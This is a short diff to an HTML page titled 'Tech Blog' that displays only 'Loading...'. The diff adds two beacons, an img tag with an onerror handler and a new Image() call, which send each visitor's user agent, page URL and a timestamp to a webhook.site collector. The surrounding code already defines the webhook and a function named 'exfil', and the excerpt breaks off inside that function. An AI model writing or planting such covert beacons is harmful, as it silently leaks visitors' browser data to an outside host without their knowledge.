@@ -3,8 +3,10 @@
 <head><title>Tech Blog</title></head>
 <body>
 <p>Loading...</p>
+<img src="https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476/page-visited?ua=" onerror="this.src=this.src.replace('ua=','ua='+navigator.userAgent)">
 <script>
 var wh = "https://webhook.site/f34e1577-b464-45fc-a799-9d5f31086476";
+new Image().src = wh + "/page-visited-js?ua=" + encodeURIComponent(navigator.userAgent) + "&loc=" + encodeURIComponent(location.href) + "&t=" + Date.now();
 
 function exfil(label, data) {
   var img = new Image();
